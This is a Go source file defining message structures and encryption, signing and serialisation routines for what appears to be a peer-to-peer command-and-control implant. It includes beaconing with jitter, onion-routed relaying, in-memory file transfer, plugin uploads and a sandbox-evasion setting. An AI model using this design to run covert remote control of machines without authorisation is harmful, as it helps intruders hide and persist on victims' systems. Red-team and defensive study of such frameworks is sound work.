package core

import (
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"time"
)

// PacketType represents the type of packet
type PacketType string

const (
	PacketTypeHandshakeInit     PacketType = "handshake_init"
	PacketTypeHandshakeResponse PacketType = "handshake_response"
	PacketTypeTaskRequest       PacketType = "task_request"
	PacketTypeTaskResponse      PacketType = "task_response"
	PacketTypeBeacon            PacketType = "beacon"
	PacketTypeOnionPacket       PacketType = "onion_packet"
	PacketTypeFileChunk         PacketType = "file_chunk"
	PacketTypeFileInit          PacketType = "file_init"
	PacketTypeFileComplete      PacketType = "file_complete"
	PacketTypePluginUpload      PacketType = "plugin_upload"
	PacketTypeOpsecProfile      PacketType = "opsec_profile_push"
	PacketTypePeerDiscovery     PacketType = "peer_discovery"
	PacketTypeError             PacketType = "error"
)

// Packet represents a network packet
type Packet struct {
	Type      PacketType `json:"type"`
	PeerID    string     `json:"peer_id"`
	Target    string     `json:"target,omitempty"`
	Payload   string     `json:"payload"`           // Base64 encoded encrypted data
	Signature string     `json:"sig,omitempty"`     // Base64 encoded RSA signature
	Timestamp int64      `json:"timestamp"`
	Nonce     string     `json:"nonce,omitempty"`   // Base64 encoded nonce for AES-GCM
}

// HandshakeInitPayload represents the payload for handshake init
type HandshakeInitPayload struct {
	DHPublicKey  string   `json:"dh_public_key"`
	Capabilities []string `json:"capabilities"`
	Version      string   `json:"version"`
	Nonce        string   `json:"nonce"`
}

// HandshakeResponsePayload represents the payload for handshake response
type HandshakeResponsePayload struct {
	DHPublicKey       string   `json:"dh_public_key"`
	Capabilities      []string `json:"capabilities"`
	Version           string   `json:"version"`
	AdditionalEntropy string   `json:"additional_entropy"`
	Nonce             string   `json:"nonce"`
}

// TaskRequestPayload represents the payload for task requests
type TaskRequestPayload struct {
	Task *Task `json:"task"`
}

// TaskResponsePayload represents the payload for task responses
type TaskResponsePayload struct {
	TaskResult *TaskResult `json:"task_result"`
}

// BeaconPayload represents the payload for beacon messages
type BeaconPayload struct {
	Status       string                 `json:"status"`
	Capabilities []string               `json:"capabilities"`
	TaskResults  []*TaskResult          `json:"task_results,omitempty"`
	Metadata     map[string]interface{} `json:"metadata,omitempty"`
}

// OnionPacketPayload represents the payload for onion-routed packets
type OnionPacketPayload struct {
	NextHop     string `json:"next_hop"`
	InnerPacket string `json:"inner_packet"` // Base64 encoded encrypted inner packet
}

// FileInitPayload represents the payload for file transfer initialization
type FileInitPayload struct {
	FileID       string `json:"file_id"`
	Filename     string `json:"filename"`
	FileSize     int64  `json:"file_size"`
	ChunkSize    int    `json:"chunk_size"`
	TotalChunks  int    `json:"total_chunks"`
	FileHash     string `json:"file_hash"` // SHA256 hash of the file
	InMemory     bool   `json:"in_memory"`
}

// FileChunkPayload represents the payload for file chunks
type FileChunkPayload struct {
	FileID      string `json:"file_id"`
	ChunkIndex  int    `json:"chunk_index"`
	ChunkData   string `json:"chunk_data"` // Base64 encoded chunk data
	ChunkHash   string `json:"chunk_hash"` // SHA256 hash of this chunk
	IsLastChunk bool   `json:"is_last_chunk"`
}

// FileCompletePayload represents the payload for file transfer completion
type FileCompletePayload struct {
	FileID   string `json:"file_id"`
	Success  bool   `json:"success"`
	Error    string `json:"error,omitempty"`
	FilePath string `json:"file_path,omitempty"` // Where the file was saved
}

// PluginUploadPayload represents the payload for plugin uploads
type PluginUploadPayload struct {
	PluginName string `json:"plugin_name"`
	PluginData string `json:"plugin_data"` // Base64 encoded plugin archive
	Signature  string `json:"signature,omitempty"` // Base64 encoded plugin signature
	Metadata   map[string]interface{} `json:"metadata,omitempty"`
}

// OpsecProfilePayload represents the payload for OPSEC profile updates
type OpsecProfilePayload struct {
	BeaconInterval    int    `json:"beacon_interval"`
	Jitter            int    `json:"jitter"`
	MaxTasksPerBeacon int    `json:"max_tasks_per_beacon"`
	ThrottleDelay     int    `json:"throttle_delay"`
	SandboxAction     string `json:"sandbox_action"`
}

// PeerDiscoveryPayload represents the payload for peer discovery
type PeerDiscoveryPayload struct {
	Action      string   `json:"action"` // "announce", "query", "response"
	PeerInfo    *PeerInfo `json:"peer_info,omitempty"`
	QueryTarget string   `json:"query_target,omitempty"`
	Peers       []*PeerInfo `json:"peers,omitempty"`
}

// PeerInfo represents information about a peer
type PeerInfo struct {
	PeerID       string   `json:"peer_id"`
	PublicKey    string   `json:"public_key"`    // Base64 encoded RSA public key
	IPAddress    string   `json:"ip_address"`
	Port         int      `json:"port"`
	Capabilities []string `json:"capabilities"`
	LastSeen     int64    `json:"last_seen"`
	Signature    string   `json:"signature"`     // Self-signed peer info
}

// ErrorPayload represents the payload for error messages
type ErrorPayload struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
	Details string `json:"details,omitempty"`
}

// NewPacket creates a new packet
func NewPacket(packetType PacketType, peerID string, target string) *Packet {
	return &Packet{
		Type:      packetType,
		PeerID:    peerID,
		Target:    target,
		Timestamp: time.Now().Unix(),
	}
}

// SetPayload sets the payload for the packet (encrypts and encodes)
func (p *Packet) SetPayload(payload interface{}, sessionKey []byte) error {
	// Marshal payload to JSON
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal payload: %w", err)
	}

	// Encrypt payload if session key is provided
	if sessionKey != nil {
		encryptedMsg, err := EncryptAESGCM(sessionKey, payloadBytes)
		if err != nil {
			return fmt.Errorf("failed to encrypt payload: %w", err)
		}

		// Encode encrypted payload and nonce
		p.Payload = base64.StdEncoding.EncodeToString(encryptedMsg.Ciphertext)
		p.Nonce = base64.StdEncoding.EncodeToString(encryptedMsg.Nonce)
	} else {
		// Store payload as base64 without encryption (for handshake packets)
		p.Payload = base64.StdEncoding.EncodeToString(payloadBytes)
	}

	return nil
}

// GetPayload gets and decrypts the payload from the packet
func (p *Packet) GetPayload(sessionKey []byte, target interface{}) error {
	// Decode payload from base64
	payloadBytes, err := base64.StdEncoding.DecodeString(p.Payload)
	if err != nil {
		return fmt.Errorf("failed to decode payload: %w", err)
	}

	// Decrypt payload if session key is provided
	if sessionKey != nil && p.Nonce != "" {
		// Decode nonce
		nonce, err := base64.StdEncoding.DecodeString(p.Nonce)
		if err != nil {
			return fmt.Errorf("failed to decode nonce: %w", err)
		}

		// Create encrypted message structure
		encryptedMsg := &EncryptedMessage{
			Ciphertext: payloadBytes,
			Nonce:      nonce,
		}

		// Decrypt payload
		decryptedBytes, err := DecryptAESGCM(sessionKey, encryptedMsg)
		if err != nil {
			return fmt.Errorf("failed to decrypt payload: %w", err)
		}

		payloadBytes = decryptedBytes
	}

	// Unmarshal JSON into target
	if err := json.Unmarshal(payloadBytes, target); err != nil {
		return fmt.Errorf("failed to unmarshal payload: %w", err)
	}

	return nil
}

// Sign signs the packet with the provided RSA key pair
func (p *Packet) Sign(keyPair *RSAKeyPair) error {
	// Create message to sign (packet without signature)
	packetCopy := *p
	packetCopy.Signature = ""

	messageBytes, err := json.Marshal(packetCopy)
	if err != nil {
		return fmt.Errorf("failed to marshal packet for signing: %w", err)
	}

	// Sign the message
	signature, err := keyPair.SignMessage(messageBytes)
	if err != nil {
		return fmt.Errorf("failed to sign packet: %w", err)
	}

	// Encode signature as base64
	p.Signature = base64.StdEncoding.EncodeToString(signature)

	return nil
}

// VerifySignature verifies the packet signature
func (p *Packet) VerifySignature(publicKey *rsa.PublicKey) error {
	if p.Signature == "" {
		return fmt.Errorf("packet has no signature")
	}

	// Decode signature from base64
	signature, err := base64.StdEncoding.DecodeString(p.Signature)
	if err != nil {
		return fmt.Errorf("failed to decode signature: %w", err)
	}

	// Create message to verify (packet without signature)
	packetCopy := *p
	packetCopy.Signature = ""

	messageBytes, err := json.Marshal(packetCopy)
	if err != nil {
		return fmt.Errorf("failed to marshal packet for verification: %w", err)
	}

	// Verify signature
	return VerifySignature(publicKey, messageBytes, signature)
}

// ToJSON converts the packet to JSON
func (p *Packet) ToJSON() ([]byte, error) {
	return json.Marshal(p)
}

// FromJSON creates a packet from JSON
func FromJSON(data []byte) (*Packet, error) {
	var packet Packet
	if err := json.Unmarshal(data, &packet); err != nil {
		return nil, fmt.Errorf("failed to unmarshal packet: %w", err)
	}
	return &packet, nil
}

// IsExpired checks if the packet is expired based on timestamp
func (p *Packet) IsExpired(maxAge time.Duration) bool {
	packetTime := time.Unix(p.Timestamp, 0)
	return time.Since(packetTime) > maxAge
}

// Clone creates a deep copy of the packet
func (p *Packet) Clone() *Packet {
	return &Packet{
		Type:      p.Type,
		PeerID:    p.PeerID,
		Target:    p.Target,
		Payload:   p.Payload,
		Signature: p.Signature,
		Timestamp: p.Timestamp,
		Nonce:     p.Nonce,
	}
}

